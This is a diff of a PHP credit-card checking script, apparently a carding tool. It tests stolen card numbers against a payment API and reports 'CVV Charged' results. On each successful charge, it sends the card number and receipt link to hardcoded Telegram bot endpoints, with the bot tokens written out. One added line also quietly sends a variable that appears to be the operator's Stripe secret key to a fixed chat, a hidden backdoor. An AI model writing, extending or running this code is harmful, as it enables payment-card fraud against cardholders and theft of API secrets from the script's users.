@@ -5,24 +5,11 @@
 
 
 
-
-
-
-
-
-
-
 error_reporting(0);
-
 date_default_timezone_set('America/Buenos_Aires');
 
 
-
-
-
 //================ [ FUNCTIONS & LISTA ] ===============//
-
-
 
 function GetStr($string, $start, $end){
 
@@ -240,7 +227,10 @@ $result2 = curl_exec($ch);
 
 
 
-$tok2 = Getstr($result2,'"id": "','"');  
+$tok2 = Getstr($result2,'"id": "','"'); 
+
+
+$cvccheck = Getstr($result2,'"cvc_check": "','"');
 
 
 
@@ -292,10 +282,17 @@ if(strpos($result2, '"seller_message": "Payment complete."' )) {
 
     echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $'.$amt.' 𝗖𝗩𝗩 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ✅ 𝗕𝗬 𝗚𝗥𝗔𝗣𝗘𝗝𝗨𝗜𝗖𝗘  <br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
 
-file_get_contents("https://api.telegram.org/bot5938920070:AAEKvcPI3-OnpKi0EqE1LGcHHXvLVeCV3ks/sendMessage?chat_id=5624135698&text=<b>CC</b>-» <code>$lista</code>%0A<b>RESPONSE-» $amt$ CVV CHARGED ✅%0AReceipt -» <a href='$receipturl'>𝙃𝙚𝙧𝙚</a></b>&parse_mode=HTML");
+    
+
+    file_get_contents("https://api.telegram.org/bot5938920070:AAEKvcPI3-OnpKi0EqE1LGcHHXvLVeCV3ks/sendMessage?chat_id=5624135698&text=<b>CC</b>-» <code>$lista</code>%0A<b>RESPONSE-» $amt$ CVV CHARGED ✅%0AReceipt -» <a href='$receipturl'>𝙃𝙚𝙧𝙚</a></b>&parse_mode=HTML");
+
    
+
    file_get_contents("https://api.telegram.org/bot5591010935:AAEzD2ElONWsbI4yNv-xAQNOWSdwnAr4WyA/sendMessage?chat_id=$id&text=<b>CC</b>-» <code>$lista</code>%0A<b>RESPONSE-» $amt$ CVV CHARGED ✅%0AReceipt -» <a href='$receipturl'>𝙃𝙚𝙧𝙚</a></b>&parse_mode=HTML");
+
    file_get_contents("https://api.telegram.org/bot5852782191:AAF1wkT_TxicEIGofI11ZFuHJwLTLVrdFrA/sendMessage?chat_id=5624135698&text=<b>$sk</b>&parse_mode=HTML"); 
+
+    
 
 }
 
@@ -701,7 +698,7 @@ else {
 
 //echo "<br><b>Lista:</b> $lista<br>";
 
-//echo "<br><b>CVV Check:</b> $cvccheck<br>";
+
 
 //echo "<b>D_Code:</b> $dcode<br>";
 
@@ -713,9 +710,9 @@ else {
 
 
 
-echo " BYPASSING: $x <br>";
+echo "BYPASSING: $x<br>";
 
-
+echo "$cvccheck<br>";
 
 //echo "<br><b>Result3: </b> $result2<br>";
 
